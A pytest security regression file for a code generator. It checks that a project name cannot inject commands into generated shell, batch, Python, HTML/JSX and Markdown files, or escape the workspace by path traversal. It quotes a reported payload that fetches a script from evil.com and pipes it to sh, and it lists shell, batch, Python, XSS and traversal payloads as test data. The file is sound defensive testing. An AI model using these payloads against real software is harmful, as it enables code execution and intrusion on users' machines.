"""SECURITY-002 — free-text injection into generated artefacts.

Reported by the user:

    ``run_scripts()`` filtered only ``% ^ &`` — the Windows/batch
    metacharacters — but the same string was also interpolated into
    ``run.sh`` inside double quotes. In POSIX shell, ``$(...)`` and backticks
    are still evaluated inside double quotes, so a project named

        My Shop$(curl evil.com/x.sh|sh)

    executed arbitrary code every time the end user double-clicked
    ``run.sh``.

Investigating that report showed the same root cause reached four more
targets, because the project *display* name is deliberately not passed
through ``safe_identifier`` (it must stay human-readable) yet is interpolated
into five different grammars.

These tests assert on the *semantics* of the generated artefact — does bash
actually execute it, does Python parse it to a literal — rather than on the
presence of particular characters. A test that greps for ``$(`` would pass
against an escaper that merely deleted that one sequence.
"""
from __future__ import annotations

import ast
import glob
import os
import subprocess
import sys
import textwrap
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from app.generator.base import make_env  # noqa: E402
from app.generator.escaping import (  # noqa: E402
    bat_echo,
    flatten,
    html_text,
    jsx_text,
    md_text,
    py_doc,
    py_str,
    sh_str,
)
from app.services.export import run_scripts  # noqa: E402

RENDER_CTX = dict(
    slug="shop",
    auth="none",
    docker=False,
    entities=[],
    endpoints=[],
    tables=[],
    relations=[],
    project={"name": "x"},
    description="",
    endpoint_count=0,
    has_custom=False,
    custom_routers=[],
    has_entities=False,
    fields=[],
)


# ── the reported exploit ─────────────────────────────────
def test_reported_exploit_does_not_execute(tmp_path):
    """The exact payload from the report must not run a command."""
    marker = tmp_path / "PWNED"
    name = f"My Shop$(touch {marker})"

    sh = {f.path: f.content for f in run_scripts(name)}["run.sh"]
    banner = "\n".join(
        line for line in sh.splitlines() if line.startswith(("echo", "printf"))
    )
    script = tmp_path / "banner.sh"
    script.write_text("#!/usr/bin/env bash\n" + banner + "\n")

    subprocess.run(["bash", str(script)], capture_output=True, text=True, timeout=20)
    assert not marker.exists(), "command substitution executed from the project name"


def test_reported_exploit_still_shows_the_name(tmp_path):
    """Escaping must not silently swallow the banner."""
    sh = {f.path: f.content for f in run_scripts("My Shop$(id)")}["run.sh"]
    banner = "\n".join(
        line for line in sh.splitlines() if line.startswith(("echo", "printf"))
    )
    script = tmp_path / "banner.sh"
    script.write_text("#!/usr/bin/env bash\n" + banner + "\n")
    out = subprocess.run(
        ["bash", str(script)], capture_output=True, text=True, timeout=20
    ).stdout
    # printed literally, not evaluated
    assert "My Shop$(id)" in out
    assert "uid=" not in out


SHELL_PAYLOADS = [
    pytest.param("Shop$(touch {m})", id="subshell"),
    pytest.param("Shop`touch {m}`", id="backtick"),
    pytest.param('Shop"; touch {m}; echo "', id="double-quote-break"),
    pytest.param("Shop'; touch {m}; echo '", id="single-quote-break"),
    pytest.param("Shop\ntouch {m}\n", id="newline"),
    pytest.param("Shop\r\ntouch {m}\r\n", id="crlf"),
    pytest.param("Shop$(echo $(touch {m}))", id="nested-subshell"),
    pytest.param("Shop\x00touch {m}", id="nul-byte"),
    pytest.param("$(touch {m})", id="payload-only"),
]


@pytest.mark.parametrize("template", SHELL_PAYLOADS)
def test_run_sh_never_executes_the_name(template, tmp_path):
    marker = tmp_path / "PWNED"
    sh = {f.path: f.content for f in run_scripts(template.format(m=marker))}["run.sh"]

    banner = "\n".join(
        line for line in sh.splitlines() if line.startswith(("echo", "printf"))
    )
    script = tmp_path / "banner.sh"
    script.write_text("#!/usr/bin/env bash\n" + banner + "\n")
    subprocess.run(["bash", str(script)], capture_output=True, text=True, timeout=20)

    assert not marker.exists()


def test_run_sh_is_syntactically_valid_bash():
    """A hostile name must not break the script for everyone else."""
    for name in ("My Shop", "it's", 'a"b', "Shop$(id)", "کافه", "100% & More"):
        sh = {f.path: f.content for f in run_scripts(name)}["run.sh"]
        r = subprocess.run(
            ["bash", "-n"], input=sh, capture_output=True, text=True, timeout=20
        )
        assert r.returncode == 0, f"{name!r} produced invalid bash: {r.stderr}"


# ── batch ────────────────────────────────────────────────
BAT_METACHARS = '|<>&^%"'


@pytest.mark.parametrize(
    "name",
    [
        "Shop | calc.exe",
        "Shop > C:\\Windows\\x.txt",
        "Shop & calc.exe",
        "Shop ^& calc.exe",
        "Shop %PATH%",
        'Shop" & calc.exe & "',
        "Shop <nul",
    ],
)
def test_run_bat_strips_every_cmd_metacharacter(name):
    bat = {f.path: f.content for f in run_scripts(name)}["run.bat"]
    banner = [l for l in bat.splitlines() if "Shop" in l]
    assert len(banner) == 1, "name must stay on one line"
    assert not any(c in banner[0] for c in BAT_METACHARS)


@pytest.mark.parametrize("name", ["Shop\r\ncalc.exe", "Shop\ncalc.exe"])
def test_run_bat_collapses_newlines(name):
    """A newline in batch ends the statement — quoting cannot fix it."""
    bat = {f.path: f.content for f in run_scripts(name)}["run.bat"]
    assert not any(l.strip() == "calc.exe" for l in bat.splitlines())


def test_bat_echo_never_returns_empty():
    """An all-metacharacter name must still leave a printable banner."""
    assert bat_echo("%%%^^^&&&") == "Project"
    assert bat_echo("") == "Project"
    assert bat_echo(None) == "Project"


# ── python source ────────────────────────────────────────
PY_PAYLOADS = [
    'Shop" + __import__("os").system("id") + "',
    'Shop""" ; import os; os.system("id") #',
    "Shop\\",
    "Shop\nimport os",
    'a"""\nimport os\n"""',
    "Shop\u202e evil",
]


@pytest.mark.parametrize("name", PY_PAYLOADS)
def test_generated_config_keeps_project_name_a_literal(name):
    env = make_env("backend")
    src = env.get_template("config.py.j2").render(name=name, **RENDER_CTX)

    tree = ast.parse(src)  # must still be valid Python
    node = next(
        n.value
        for n in ast.walk(tree)
        if isinstance(n, ast.AnnAssign) and getattr(n.target, "id", "") == "PROJECT_NAME"
    )
    assert isinstance(node, ast.Constant) and isinstance(node.value, str), (
        "PROJECT_NAME must be an inert string literal, got "
        f"{ast.dump(node)[:80]}"
    )


@pytest.mark.parametrize("name", PY_PAYLOADS)
def test_generated_main_still_parses(name):
    env = make_env("backend")
    src = env.get_template("main.py.j2").render(name=name, **RENDER_CTX)
    ast.parse(src)


def test_py_str_round_trips():
    for raw in ("My Shop", "it's", 'a"b', "کافه", "Ω"):
        assert ast.literal_eval(py_str(raw)) == flatten(raw)


def test_py_doc_cannot_close_the_docstring():
    assert '"""' not in py_doc('a """ b')
    assert not py_doc("trail\\").endswith("\\")


# ── html / jsx ───────────────────────────────────────────
@pytest.mark.parametrize(
    "name",
    [
        "<script>alert(1)</script>",
        '" onload="alert(1)',
        "</title><script>alert(1)</script>",
    ],
)
def test_generated_html_escapes_the_title(name):
    env = make_env("frontend")
    src = env.get_template("index.html.j2").render(name=name, **RENDER_CTX)
    line = next(l for l in src.splitlines() if "<title>" in l)
    inner = line.split("<title>", 1)[1].split("</title>", 1)[0]
    assert "<" not in inner and ">" not in inner and '"' not in inner


@pytest.mark.parametrize(
    "template",
    ["Layout.tsx.j2", "Home.tsx.j2", "Login.tsx.j2"],
)
@pytest.mark.parametrize(
    "name",
    [
        "</Link><img onerror=alert(1) src=x />",
        "{alert(1)}",
        '</script><script>alert(1)</script>',
        'a"b',
        "back\\slash",
    ],
)
def test_generated_jsx_emits_the_name_as_a_string_literal(template, name):
    """The name must land inside a JS string, never as raw markup.

    Text inside ``{"..."}`` is inert: React escapes it at render time, and it
    cannot close the surrounding element. So the assertion is not "the
    dangerous substring is absent" — it is "the dangerous substring only ever
    appears inside the quoted literal we emitted".
    """
    env = make_env("frontend")
    src = env.get_template(template).render(name=name, **RENDER_CTX)

    literal = jsx_text(name)
    assert literal in src, "name was not emitted through the jsx_text filter"

    # Remove our own literal; the payload must not survive anywhere else.
    rest = src.replace(literal, "")
    for marker in ("<img onerror", "</Link>< img", "<script>alert"):
        assert marker not in rest
    # a JSX expression container can never terminate a <script> block
    assert "</" not in literal


def test_jsx_text_cannot_terminate_a_script_block():
    assert "</" not in jsx_text("</script>")


def test_jsx_text_is_valid_json_after_unwrapping():
    import json

    for raw in ("My Shop", 'a"b', "back\\slash", "کافه"):
        out = jsx_text(raw)
        assert out.startswith("{") and out.endswith("}")


# ── markdown ─────────────────────────────────────────────
def test_generated_readme_neutralises_markdown_syntax():
    env = make_env("root")
    src = env.get_template("README.md.j2").render(
        name="Shop [click](http://evil) ![i](h)", **RENDER_CTX
    )
    heading = src.splitlines()[0]
    assert "](http://evil)" not in heading
    assert "\\[" in heading


# ── flatten: the shared first stage ──────────────────────
@pytest.mark.parametrize(
    "raw,expected",
    [
        ("Shop\ncalc.exe", "Shop calc.exe"),
        ("Shop\r\ncalc.exe", "Shop calc.exe"),
        ("a\x00b", "ab"),
        ("a\tb", "a b"),
        ("  padded  ", "padded"),
        ("a\u202eb", "ab"),
        ("a\u2028b", "ab"),
    ],
)
def test_flatten_removes_statement_terminators(raw, expected):
    assert flatten(raw) == expected


def test_flatten_is_length_capped():
    out = flatten("A" * 5000)
    assert len(out) <= 201


def test_flatten_preserves_normal_unicode():
    assert flatten("فروشگاه من") == "فروشگاه من"
    assert flatten("Café Léon") == "Café Léon"


# ── the escapers are total, not blocklists ───────────────
def test_sh_str_is_inert_for_every_ascii_character(tmp_path):
    """Fuzz every ASCII byte through a real bash, not a character check."""
    marker = tmp_path / "PWNED"
    for code in range(32, 127):
        ch = chr(code)
        name = f"a{ch}b$(touch {marker})`touch {marker}`"
        script = tmp_path / "f.sh"
        script.write_text(f"#!/usr/bin/env bash\nprintf '%s' {sh_str(name)}\n")
        r = subprocess.run(
            ["bash", str(script)], capture_output=True, text=True, timeout=20
        )
        assert r.returncode == 0, f"char {code} ({ch!r}) broke the script"
        assert not marker.exists(), f"char {code} ({ch!r}) allowed execution"


def test_bat_echo_allowlist_rejects_unknown_characters():
    """An allowlist must drop things nobody thought of, not keep them."""
    for code in range(0, 128):
        out = bat_echo(f"a{chr(code)}b")
        assert not any(c in out for c in BAT_METACHARS)


# ── SECURITY-003: traversal via the project display name ─
# Found while investigating SECURITY-002. routers/projects.py had its own
# slug (`name.lower().replace(" ", "-")`) that kept "/" and "..", so the
# stored path "~/Projects/../../../tmp/x" wrote outside the workspace.
from app.generator.base import project_slug  # noqa: E402
from app.generator.writer import (  # noqa: E402
    apply_plan,
    build_plan,
    default_workspace,
    resolve_target,
)


@pytest.mark.parametrize(
    "name",
    [
        "../../../../tmp/escaped",
        "..\\..\\..\\Windows\\System32",
        "a/../../../../../../tmp/x",
        "....//....//tmp/y",
        "/etc/cron.d",
        "..",
        ".",
        "",
        "   ",
        "///",
        "C:\\Windows",
    ],
)
def test_project_slug_is_a_single_safe_segment(name):
    slug = project_slug(name)
    assert "/" not in slug and "\\" not in slug
    assert ".." not in slug
    assert slug not in ("", ".", "..")
    assert not slug.startswith((".", "-"))


def test_project_slug_keeps_readable_names():
    assert project_slug("My Shop") == "my-shop"
    assert project_slug("Order_Service 2") == "order_service-2"


@pytest.mark.parametrize(
    "name",
    ["../../../../tmp/escaped", "a/../../../../../../tmp/x", "..\\..\\..\\Windows"],
)
def test_export_target_stays_inside_the_workspace(name):
    slug = project_slug(name)
    target = resolve_target(f"~/Projects/{slug}", slug).resolve()
    target.relative_to(default_workspace().resolve())  # raises if it escaped


@pytest.mark.parametrize(
    "stored",
    [
        "~/Projects/../../../../tmp/legacy_escape",
        "~/Projects/a/../../../../tmp/z",
        "~/Projects/./../../tmp/q",
    ],
)
def test_legacy_stored_paths_are_contained(stored):
    """Rows written before the fix must not escape either."""
    target = resolve_target(stored, "fallback").resolve()
    target.relative_to(default_workspace().resolve())


def test_export_actually_writes_inside_the_workspace(tmp_path, monkeypatch):
    """End-to-end: plan + apply must not land outside the workspace."""
    monkeypatch.setattr(
        "app.generator.writer.default_workspace", lambda: tmp_path / "ws"
    )
    from app.generator import writer

    probe = tmp_path / "OUTSIDE"
    rel = os.path.relpath(probe, tmp_path / "ws")
    slug = project_slug(rel)
    target = writer.resolve_target(f"~/Projects/{slug}", slug)

    plans = writer.build_plan([GeneratedFileForTest("owned.txt", "x")], target)
    writer.apply_plan(plans, target)

    assert not probe.exists(), "export escaped the workspace"


from app.generator.base import GeneratedFile as GeneratedFileForTest  # noqa: E402
